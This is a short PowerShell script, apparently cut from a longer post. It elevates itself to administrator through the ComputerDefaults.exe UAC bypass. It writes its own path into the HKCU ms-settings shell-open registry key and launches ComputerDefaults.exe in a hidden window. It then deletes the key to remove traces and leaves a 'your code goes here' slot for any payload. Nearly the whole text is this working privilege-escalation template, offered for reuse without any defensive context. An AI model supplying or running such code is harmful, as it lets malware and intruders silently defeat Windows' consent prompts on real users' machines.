function Test-Admin { ... } # (same function as above)

if (-not (Test-Admin)) {
    Write-Host "[INFO] Using ComputerDefaults bypass..." -ForegroundColor Yellow
    
    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value "$PSCommandPath" -Force
    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
    
    Start-Process "C:\Windows\System32\ComputerDefaults.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "`n[+] Running with Administrator privileges." -ForegroundColor Green

# your code goes here
pause
